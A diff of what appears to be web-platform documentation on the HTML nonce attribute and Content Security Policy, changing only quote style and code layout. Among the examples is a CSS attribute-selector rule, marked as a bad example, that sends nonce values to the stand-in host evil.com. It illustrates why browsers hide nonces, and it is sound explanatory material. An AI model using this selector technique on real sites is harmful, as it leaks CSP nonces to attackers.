@@ -35,8 +35,8 @@ From your web server, generate a random base64-encoded string of at least 128 bi
 random number generator. Nonces should be generated differently each time the page loads (nonce only once!). For example, in nodejs:
 
 ```js
-const crypto = require('crypto');
-crypto.randomBytes(16).toString('base64');
+const crypto = require("crypto");
+crypto.randomBytes(16).toString("base64");
 // '8IBTHwOdqNKAWeKl7plt8g=='
 ```
 
@@ -45,7 +45,9 @@ crypto.randomBytes(16).toString('base64');
 The nonce generated on your backend code should now be used for the inline script that you'd like to allow-list:
 
 ```html
-<script nonce="8IBTHwOdqNKAWeKl7plt8g==">…</script>
+<script nonce="8IBTHwOdqNKAWeKl7plt8g==">
+  // …
+</script>
 ```
 
 #### Sending a nonce with a CSP header
@@ -63,7 +65,7 @@ Content-Security-Policy: script-src 'nonce-8IBTHwOdqNKAWeKl7plt8g=='
 For security reasons, the `nonce` content attribute is hidden (an empty string will be returned).
 
 ```js example-bad
-script.getAttribute('nonce'); // returns empty string
+script.getAttribute("nonce"); // returns empty string
 ```
 
 The [`nonce`](/en-US/docs/Web/API/HTMLElement/nonce) property is the only way to access nonces:
@@ -76,7 +78,7 @@ Nonce hiding helps prevent attackers from exfiltrating nonce data via mechanisms
 from content attributes like this:
 
 ```css example-bad
-script[nonce~=whatever] {
+script[nonce~="whatever"] {
   background: url("https://evil.com/nonce?whatever");
 }
 ```
